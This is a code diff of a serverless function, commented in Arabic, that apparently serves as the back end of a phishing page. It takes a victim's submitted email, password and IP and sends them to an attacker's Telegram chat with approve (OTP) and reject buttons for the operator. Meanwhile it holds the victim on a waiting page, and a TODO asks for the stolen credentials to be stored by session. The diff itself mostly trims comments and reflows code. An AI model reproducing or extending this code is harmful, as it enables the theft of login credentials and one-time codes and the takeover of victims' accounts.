@@ -1,7 +1,6 @@
 const fetch = require('node-fetch');
 const { v4: uuidv4 } = require('uuid'); 
 
-// دوال مساعدة لترميز البيانات والحصول على IP
 const getClientIp = (headers) => {
     return headers['x-nf-client-connection-ip'] || 
            headers['client-ip'] || 
@@ -35,9 +34,6 @@ exports.handler = async (event, context) => {
         return { statusCode: 303, headers: { Location: '/waiting.html' } };
     }
     
-    // ... (هنا يتم وضع منطق فحص البصمة المتبقي، إذا أردت تطبيقه قبل إرسال التلجرام) ...
-    // سنفترض الآن أن الزائر بشري ونتابع المعالجة.
-    
     // ----------------------------------------------------------------
     // 2. إدارة الجلسة وإرسال Telegram
     // ----------------------------------------------------------------
@@ -49,16 +45,9 @@ exports.handler = async (event, context) => {
     const password = bodyParams.get('login_password') || 'غير متوفر';
     
     // **TODO: تخزين الحالة الأولية في قاعدة بياناتك الخارجية**
-    // يجب تخزين بيانات تسجيل الدخول + (status: 'pending') مرتبطين بـ sessionId.
-    // مثال: 
-    // await db.collection('sessions').insertOne({ 
-    //     id: sessionId, 
-    //     status: 'pending', 
-    //     email: email, 
-    //     password: password, 
-    //     ip: ip 
-    // }); 
-
+    // يجب تخزين: { id: sessionId, status: 'pending', email: email, password: password, ip: ip }
+    // ...
+    
     // ---------------------------------------------------------------
     // 3. بناء أزرار Telegram المضمنة (Inline Keyboard)
     // ---------------------------------------------------------------
@@ -66,14 +55,8 @@ exports.handler = async (event, context) => {
     const inlineKeyboard = {
         inline_keyboard: [
             [
-                { 
-                    text: "✅ الموافقة (OTP)", 
-                    callback_data: `action=approved&id=${sessionId}` 
-                },
-                { 
-                    text: "❌ الرفض (Block)", 
-                    callback_data: `action=rejected&id=${sessionId}` 
-                }
+                { text: "✅ الموافقة (OTP)", callback_data: `action=approved&id=${sessionId}` },
+                { text: "❌ الرفض (Block)", callback_data: `action=rejected&id=${sessionId}` }
             ]
         ]
     };
@@ -106,7 +89,7 @@ exports.handler = async (event, context) => {
                     chat_id: TELEGRAM_CHAT_ID,
                     text: message_text,
                     parse_mode: 'MarkdownV2',
-                    reply_markup: inlineKeyboard // إضافة الأزرار
+                    reply_markup: inlineKeyboard
                 })
             });
         } catch (error) {
